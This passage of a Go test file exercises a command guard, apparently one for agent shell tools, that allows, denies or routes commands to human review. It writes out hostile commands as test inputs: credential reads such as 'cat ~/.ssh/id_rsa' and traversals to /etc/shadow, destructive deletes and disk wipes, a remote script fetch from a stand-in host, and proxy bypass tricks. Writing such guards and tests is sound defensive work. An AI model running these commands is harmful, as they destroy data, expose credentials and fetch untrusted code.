		t.Errorf("code URL decision = %q, want deny: %+v", decision, findings)
	}
	if !hasRule(findings, ruleNetworkID) {
		t.Errorf("missing R-NET-001 for code URL: %+v", findings)
	}

	// Whitelisted URL and no bridge -> allow.
	_, decision = scanCode(t, p, []CodeBlock{{
		Language: "python",
		Code:     `print(open("data.txt").read())  # docs: https://github.com/org/repo`,
	}})
	if decision != DecisionAllow {
		t.Errorf("benign python should allow, got %q", decision)
	}
}

// TestWgetInputFileFailsClosed pins that the URL-list options, whose real
// targets live in a file the guard cannot read, fail closed.
func TestWgetInputFileFailsClosed(t *testing.T) {
	p := loadExamplePolicy(t)
	for _, cmd := range []string{
		`wget --input-file=/tmp/urls`,
		`wget -i /tmp/urls`,
		`wget --input-file /tmp/urls https://github.com/a`,
	} {
		findings, decision := scanCmd(t, p, BackendWorkspace, cmd)
		if decision != DecisionDeny {
			t.Errorf("%q: decision = %q, want deny (findings: %+v)", cmd, decision, findings)
		}
		if !hasRule(findings, ruleNetworkID) {
			t.Errorf("%q: missing R-NET-001: %+v", cmd, findings)
		}
	}
}

// TestDownloadNoTargetReview pins the fallback: a download command that carries
// a bare operand we could not turn into a checkable host is routed to review
// instead of silently allowed.
func TestDownloadNoTargetReview(t *testing.T) {
	p := loadExamplePolicy(t)
	// -O consumes out.bin; the trailing "./payload" is a bare operand that
	// yields no host, so it cannot be cleared against the whitelist.
	findings, decision := scanCmd(t, p, BackendWorkspace, `wget -O out.bin ./payload`)
	if decision != DecisionReview {
		t.Errorf("decision = %q, want needs_human_review (findings: %+v)", decision, findings)
	}
	if !hasRule(findings, ruleNetworkID) {
		t.Errorf("missing R-NET-001 fallback finding: %+v", findings)
	}
}

// TestDownloadInformationalFlagsAllow pins that pure-flag download invocations
// (no operand, no egress) are not caught by the no-target fallback: they must
// allow, not route to review.
func TestDownloadInformationalFlagsAllow(t *testing.T) {
	p := loadExamplePolicy(t)
	for _, cmd := range []string{
		`curl --version`,
		`curl -V`,
		`wget --version`,
		`wget --help`,
		`wget --tries=3`,
	} {
		findings, decision := scanCmd(t, p, BackendWorkspace, cmd)
		if decision != DecisionAllow {
			t.Errorf("%q: decision = %q, want allow (findings: %+v)", cmd, decision, findings)
		}
	}
}

// TestRmRecursiveSystemWithoutForce pins that "rm -r /etc" is critical even
// without -f: force is not what makes deleting a system tree destructive.
func TestRmRecursiveSystemWithoutForce(t *testing.T) {
	p := loadExamplePolicy(t)
	findings, decision := scanCmd(t, p, BackendWorkspace, "rm -r /etc")
	if decision != DecisionDeny {
		t.Errorf("decision = %q, want deny", decision)
	}
	if !hasRule(findings, ruleDangerousID) {
		t.Errorf("missing R-DEL-001 for rm -r /etc: %+v", findings)
	}
	// Plain recursive delete of a workspace path without force stays silent.
	findings, _ = scanCmd(t, p, BackendWorkspace, "rm -r build")
	for _, f := range findings {
		if f.RuleID == ruleDangerousID {
			t.Errorf("rm -r build must not trip R-DEL-001: %+v", findings)
		}
	}
}

// TestChmodRecursiveReview covers the recursive-chmod heuristic under a policy
// that does not deny chmod outright (the default policy).
func TestChmodRecursiveReview(t *testing.T) {
	p := DefaultPolicy()
	if err := p.compile(); err != nil {
		t.Fatalf("compile: %v", err)
	}
	findings, decision := scanCmd(t, &p, BackendWorkspace, "chmod -R 777 .")
	if decision != DecisionReview {
		t.Errorf("decision = %q, want needs_human_review: %+v", decision, findings)
	}
	if !hasRule(findings, ruleDangerousID) {
		t.Errorf("missing R-DEL-001 for chmod -R: %+v", findings)
	}
	// A symbolic mode with a lowercase r is not the recursive flag.
	findings, _ = scanCmd(t, &p, BackendWorkspace, "chmod -r file.txt")
	for _, f := range findings {
		if f.RuleID == ruleDangerousID {
			t.Errorf("chmod -r (mode) must not trip R-DEL-001: %+v", findings)
		}
	}
}

// TestWindowsSystemPaths pins that Windows drive roots and system directories
// count as system paths for the rm escalation.
func TestWindowsSystemPaths(t *testing.T) {
	yes := []string{`C:\Windows`, `c:/windows/system32`, `C:\Program Files\App`, `C:`, `D:/`}
	for _, p := range yes {
		if !isRootOrSystem(p) {
			t.Errorf("isRootOrSystem(%q) = false, want true", p)
		}
	}
	no := []string{`C:\Users\dev\project`, `d:/work/repo`, "build", "./out"}
	for _, p := range no {
		if isRootOrSystem(p) {
			t.Errorf("isRootOrSystem(%q) = true, want false", p)
		}
	}
}

// TestToolMetadataDestructiveReview pins R-META-001: a tool that publishes
// destructive metadata is routed to review even when the command itself is
// clean.
func TestToolMetadataDestructiveReview(t *testing.T) {
	p := loadExamplePolicy(t)
	req := ExecRequest{Command: "ls", ToolDestructive: true}
	findings, decision, _ := p.scan(req, BackendWorkspace)
	if decision != DecisionReview {
		t.Errorf("decision = %q, want needs_human_review: %+v", decision, findings)
	}
	if !hasRule(findings, ruleMetaID) {
		t.Errorf("missing R-META-001: %+v", findings)
	}
	// Without the flag the same command allows.
	if _, decision, _ = p.scan(ExecRequest{Command: "ls"}, BackendWorkspace); decision != DecisionAllow {
		t.Errorf("non-destructive ls should allow, got %q", decision)
	}
}

// TestSecretNameHeuristic pins the name-based key=value pattern for both the
// command string and env overrides (the env key participates in the match).
func TestSecretNameHeuristic(t *testing.T) {
	p := loadExamplePolicy(t)
	findings, decision := scanCmd(t, p, BackendWorkspace, `git push https://github.com/a --config password=hunter2`)
	if !hasRule(findings, ruleSecretID) {
		t.Errorf("missing R-SECRET-001 for password= in command: %+v", findings)
	}
	if decision != DecisionReview {
		t.Errorf("decision = %q, want needs_human_review", decision)
	}
	req := ExecRequest{Command: "go test ./...", Env: map[string]string{"DB_PASSWORD": "hunter2"}}
	findings, _, _ = p.scan(req, BackendWorkspace)
	if !hasRule(findings, ruleSecretID) {
		t.Errorf("missing R-SECRET-001 for secret-named env key: %+v", findings)
	}
}

// TestResourceOutputAndConcurrency covers the head -c output cap, the
// xargs/parallel worker thresholds and the string-multiplication heuristic.
func TestResourceOutputAndConcurrency(t *testing.T) {
	p := loadExamplePolicy(t) // max_output_bytes: 1048576
	p.Commands.Allowed = append(p.Commands.Allowed, "head", "xargs", "parallel")
	if err := p.compile(); err != nil {
		t.Fatalf("compile: %v", err)
	}
	review := []string{
		`head -c 999999999 big.bin`,
		`head -c 2G big.bin`,
		`parallel -j 64 echo`,
		`parallel --jobs=0 echo`,
	}
	for _, cmd := range review {
		findings, decision := scanCmd(t, p, BackendWorkspace, cmd)
		if decision != DecisionReview {
			t.Errorf("%q: decision = %q, want needs_human_review: %+v", cmd, decision, findings)
		}
		if !hasRule(findings, ruleResourceID) {
			t.Errorf("%q: missing R-RES-001: %+v", cmd, findings)
		}
	}
	// xargs is unconditionally denied by shellsafe as a re-executing wrapper,
	// so the decision is deny either way; the concurrency finding must still
	// surface as evidence.
	for _, cmd := range []string{`xargs -P 32 grep x`, `xargs -P0 grep x`} {
		findings, _ := scanCmd(t, p, BackendWorkspace, cmd)
		if !hasRule(findings, ruleResourceID) {
			t.Errorf("%q: missing R-RES-001: %+v", cmd, findings)
		}
	}
	allow := []string{
		`head -c 512 small.bin`,
		`parallel -j 2 echo`,
	}
	for _, cmd := range allow {
		if _, decision := scanCmd(t, p, BackendWorkspace, cmd); decision != DecisionAllow {
			t.Errorf("%q should allow, got %q", cmd, decision)
		}
	}
	// python print("x" * 10000000) via the raw-text heuristic.
	findings, decision := scanCmd(t, p, BackendWorkspace, `python3 -c "print('x' * 10000000)"`)
	if decision != DecisionReview {
		t.Errorf("print-repeat decision = %q, want needs_human_review: %+v", decision, findings)
	}
	if !hasRule(findings, ruleResourceID) {
		t.Errorf("missing R-RES-001 for print repeat: %+v", findings)
	}
}

// TestReviewPipelinesKnob pins the opt-in commands.review_pipelines posture:
// off keeps legitimate pipes allowed; on routes any multi-segment pipeline to
// review.
func TestReviewPipelinesKnob(t *testing.T) {
	p := loadExamplePolicy(t) // review_pipelines: false
	if _, decision := scanCmd(t, p, BackendWorkspace, "cat a.txt | grep x"); decision != DecisionAllow {
		t.Errorf("knob off: legit pipe should allow, got %q", decision)
	}
	p.Commands.ReviewPipelines = true
	findings, decision := scanCmd(t, p, BackendWorkspace, "cat a.txt | grep x")
	if decision != DecisionReview {
		t.Errorf("knob on: decision = %q, want needs_human_review: %+v", decision, findings)
	}
	if !hasRule(findings, ruleCmdID) {
		t.Errorf("knob on: missing R-CMD-001 pipeline finding: %+v", findings)
	}
	if _, decision = scanCmd(t, p, BackendWorkspace, "ls -la"); decision != DecisionAllow {
		t.Errorf("knob on: single command should still allow, got %q", decision)
	}
}

// TestDefaultPolicyProtectiveBaseline pins the hardened out-of-the-box
// defaults: destructive binaries, privilege escalation, credential paths and
// secret shapes are caught without any policy file, while ordinary commands
// still run (no allow-list).
func TestDefaultPolicyProtectiveBaseline(t *testing.T) {
	p := DefaultPolicy()
	if err := p.compile(); err != nil {
		t.Fatalf("compile: %v", err)
	}
	deny := map[string]string{
		"sudo rm -rf /tmp/x":          ruleDangerousID,
		"dd if=/dev/zero of=/dev/sda": ruleDangerousID,
		"cat ~/.ssh/id_rsa":           ruleCredID,
	}
	for cmd, rule := range deny {
		findings, decision := scanCmd(t, &p, BackendWorkspace, cmd)
		if decision != DecisionDeny {
			t.Errorf("%q: decision = %q, want deny: %+v", cmd, decision, findings)
		}
		if !hasRule(findings, rule) {
			t.Errorf("%q: missing %s: %+v", cmd, rule, findings)
		}
	}
	for _, cmd := range []string{"go test ./...", "ls -la", "git status"} {
		if _, decision := scanCmd(t, &p, BackendWorkspace, cmd); decision != DecisionAllow {
			t.Errorf("%q should allow under the default policy, got %q", cmd, decision)
		}
	}
	// The default secret patterns include the OpenAI/Slack shapes.
	findings, _ := scanCmd(t, &p, BackendWorkspace, "curl -H 'X-Key: sk-"+strings.Repeat("a", 20)+"' https://api.example.com")
	if !hasRule(findings, ruleSecretID) {
		t.Errorf("missing R-SECRET-001 for sk- token under defaults: %+v", findings)
	}
}

// TestGenericDownloadSafeFlagsAllow guards against over-blocking: common wget
// flag usage against a whitelisted host must still be allowed after the
// generic option hardening. (ssh/scp cannot appear here: they are not in the
// example policy's commands.allowed, so R-CMD-001 would deny regardless.)
func TestGenericDownloadSafeFlagsAllow(t *testing.T) {
	p := loadExamplePolicy(t)
	for _, cmd := range []string{
		`wget https://github.com/org/repo`,
		`wget -q -O out.txt https://github.com/a`,
		`wget -qO out.txt https://github.com/a`,
		`wget --header "Accept: application/json" https://github.com/a`,
		`wget --user-agent bot --tries=3 https://github.com/a`,
	} {
		findings, decision := scanCmd(t, p, BackendWorkspace, cmd)
		if decision != DecisionAllow {
			t.Errorf("safe wget usage should allow, got %q for %q: %+v", decision, cmd, findings)
		}
	}
}

// TestBareHostNetworkDeny pins that a bare (schemeless) host argument to curl or
// wget is denied by R-NET-001 when it is not whitelisted, closing the
// "curl evil.io" bypass.
func TestBareHostNetworkDeny(t *testing.T) {
	p := loadExamplePolicy(t)
	for _, cmd := range []string{
		"curl evil.io",
		"curl -sSL evil.io/install.sh",
		"wget evil.io",
	} {
		findings, decision := scanCmd(t, p, BackendWorkspace, cmd)
		if decision != DecisionDeny {
			t.Errorf("%q: decision = %q, want deny (findings: %+v)", cmd, decision, findings)
		}
		if !hasRule(findings, ruleNetworkID) {
			t.Errorf("%q: missing R-NET-001: %+v", cmd, findings)
		}
	}
}

// TestSingleLabelHostBearingOptionDeny pins that an explicit connection target
// in a host-bearing option is whitelist-checked even when it is a single-label
// hostname: "curl --proxy=relay https://github.com/x" really connects to relay
// (resolved via local DNS or /etc/hosts), so the dotted-domain heuristic used
// for ambiguous operands must not apply to option values that are network
// targets by contract.
func TestSingleLabelHostBearingOptionDeny(t *testing.T) {
	p := loadExamplePolicy(t) // allows github.com; on_non_whitelisted: deny
	cases := []struct {
		name string
		cmd  string
	}{
		{"proxy equals single label", `curl --proxy=relay https://github.com/x`},
		{"proxy space single label", `curl -x relay https://github.com/x`},
		{"proxy inline short flag", `curl -xrelay https://github.com/x`},
		{"url equals single label", `curl --url=localhost`},
		{"url space single label", `curl --url localhost`},
		{"connect-to single label target", `curl --connect-to github.com:443:relay:443 https://github.com/a`},
		{"resolve single label addr", `curl --resolve github.com:443:relay https://github.com/a`},
		{"ssh jump single label", `ssh -J relay github.com`},
		{"nc proxy single label", `nc -x relay:1080 github.com 443`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			findings, decision := scanCmd(t, p, BackendWorkspace, tc.cmd)
			if decision != DecisionDeny {
				t.Errorf("decision = %q, want deny (findings: %+v)", decision, findings)
			}
			if !hasRule(findings, ruleNetworkID) {
				t.Errorf("missing R-NET-001 for single-label target: %+v", findings)
			}
		})
	}
}

// TestSingleLabelOperandStillAmbiguous pins that a bare single-label operand
// keeps the dotted-domain heuristic: "curl relay" is not extracted as a host
// (the token is as likely a filename), so it falls back to the
// no-parseable-target review instead of a host-based deny.
func TestSingleLabelOperandStillAmbiguous(t *testing.T) {
	p := loadExamplePolicy(t)
	findings, decision := scanCmd(t, p, BackendWorkspace, "curl relay")
	if decision != DecisionReview {
		t.Errorf("decision = %q, want needs_human_review (findings: %+v)", decision, findings)
	}
}

// TestWorkspaceHostRiskWithoutIsolation pins that workspace_exec is not
// treated as sandboxed by the tool name alone: with deny_background_on_host /
// deny_pty_on_host configured and no declared isolation, a background/PTY
// workspace call is denied exactly like the host backend, because the backend
// may be codeexecutor/local running directly on the host. Declaring
// workspace_isolated: true restores the sandbox exemption.
func TestWorkspaceHostRiskWithoutIsolation(t *testing.T) {
	p := loadExamplePolicy(t) // deny_background_on_host / deny_pty_on_host: true
	if p.WorkspaceIsolated {
		t.Fatalf("workspace_isolated should default to false (fail closed)")
	}
	req := ExecRequest{Command: "sleep 5", Background: true, PTY: true}
	findings, decision, _ := p.scan(req, BackendWorkspace)
	if decision != DecisionDeny {
		t.Errorf("decision = %q, want deny for background/PTY on undeclared workspace: %+v",
			decision, findings)
	}
	if !hasRule(findings, ruleHostID) {
		t.Errorf("missing R-HOST-001 for local-backed workspace: %+v", findings)
	}

	// nohup detaches on the host just the same when the workspace is local.
	findings, _, _ = p.scan(ExecRequest{Command: "nohup sleep 5"}, BackendWorkspace)
	if !hasRule(findings, ruleHostID) {
		t.Errorf("missing R-HOST-001 for nohup on undeclared workspace: %+v", findings)
	}

	// A declared sandbox restores the workspace exemption.
	p.WorkspaceIsolated = true
	findings, decision, _ = p.scan(req, BackendWorkspace)
	if decision != DecisionAllow {
		t.Errorf("decision = %q, want allow with workspace_isolated: true: %+v",
			decision, findings)
	}
}

// TestForbiddenPathTraversalDeny pins that forbidden-path matching sees the
// path the OS will resolve, not the literal argv spelling: dot segments,
// duplicate slashes and cwd-relative traversal must all hit the configured
// pattern.
func TestForbiddenPathTraversalDeny(t *testing.T) {
	p := loadExamplePolicy(t) // forbids /etc/shadow, ~/.ssh, **/id_rsa
	cases := []struct {
		name string
		req  ExecRequest
	}{
		{"dot segments", ExecRequest{Command: "cat /etc/../etc/shadow"}},
		{"double slash", ExecRequest{Command: "cat //etc//shadow"}},
		{"current-dir segment", ExecRequest{Command: "cat /etc/./shadow"}},
		{"relative traversal against cwd",
			ExecRequest{Command: "cat ../../../etc/shadow", Cwd: "/var/www/app"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			findings, decision, _ := p.scan(tc.req, BackendWorkspace)
			if decision != DecisionDeny {
				t.Errorf("decision = %q, want deny (findings: %+v)", decision, findings)
			}
			if !hasRule(findings, ruleCredID) {
				t.Errorf("missing R-CRED-001: %+v", findings)
			}
		})
	}
}

// TestDangerousDeleteTraversalDeny pins that the system-path check resolves
// dot segments: "rm -rf /tmp/../etc" destroys /etc just as surely as
// "rm -rf /etc".
func TestDangerousDeleteTraversalDeny(t *testing.T) {
	p := loadExamplePolicy(t)
	findings, decision := scanCmd(t, p, BackendWorkspace, "rm -rf /tmp/../etc")
	if decision != DecisionDeny {
		t.Errorf("decision = %q, want deny: %+v", decision, findings)
	}
	if !hasRule(findings, ruleDangerousID) {
		t.Errorf("missing R-DEL-001 for traversal to a system dir: %+v", findings)
	}
	if !isRootOrSystem("/tmp/../etc") {
		t.Errorf("isRootOrSystem(/tmp/../etc) = false, want true")
	}
}
